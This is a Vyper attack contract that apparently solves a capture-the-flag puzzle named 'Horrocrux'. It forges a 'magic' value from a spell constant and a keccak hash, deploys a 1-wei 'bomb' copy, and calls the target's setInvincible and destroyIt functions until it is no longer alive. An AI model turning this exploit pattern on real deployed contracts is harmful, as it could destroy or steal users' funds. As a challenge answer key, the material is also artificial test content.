# @version ^0.3.7

interface IHorrocrux:
    def alive() -> bool: view
    def destroyIt(
        spell: String[32],
        magic: uint256,
    ): nonpayable
    def setInvincible(): nonpayable

owner: immutable(address)
SPELL: constant(bytes32) = 0x45746865724b6164616272610000000000000000000000000000000000000000

horrocrux: IHorrocrux

@external
@payable
def __init__(_horrocrux: address):
    assert msg.value == 1, "send 1 wei"
    owner = msg.sender
    self.horrocrux = IHorrocrux(_horrocrux)

@external
def attack(addr: address):
    assert msg.sender == owner, "!owner"
    spell: String[32] = convert(slice(SPELL, 0, 32), String[32])
    magic: uint256 = self._get_magic()
    raw_call(self.horrocrux.address, b"hello")
    bomb: address = create_copy_of(addr, value=1)
    raw_call(bomb, _abi_encode(self.horrocrux.address))
    self.horrocrux.setInvincible()
    self.horrocrux.destroyIt(spell, magic)
    assert not self.horrocrux.alive(), "alive"

@internal
def _get_magic() -> uint256:
    spell_in_uint: uint256 = convert(SPELL, uint256)
    kedavar: uint256 = convert(keccak256("kill()"), uint256)
    return spell_in_uint - kedavar
